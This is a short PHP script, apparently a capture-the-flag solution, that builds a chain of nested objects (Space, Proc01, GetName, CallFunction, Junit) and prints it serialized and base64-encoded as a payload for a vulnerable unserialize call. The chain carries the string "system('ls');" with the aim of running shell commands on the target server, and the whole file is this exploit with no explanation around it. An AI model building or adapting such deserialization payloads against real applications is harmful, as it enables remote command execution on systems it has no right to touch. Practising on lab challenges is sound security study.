<?php
class Junit
{
    private $judge;
    function __construct()
    {
        $this->judge = True;
    }
}


class CallFunction
{
    private $num;
    public $func;
    function __construct()
    {
        $this->num=20;
        $this->func=[new Junit(),"e"];
    }
}

class GetName
{
    private $app;
    protected $args;
    function __construct()
    {
        $this->app=new CallFunction();
        $this->args="system('ls');";
    }
}

class Proc01
{
    public $param;
    function __construct()
    {
       $this->param=new GetName();
    }
}

class Space
{
    protected $name;
    function __construct()
    {
        $this->name=new Proc01();
    }
}

$a=new Space();
echo base64_encode(serialize($a));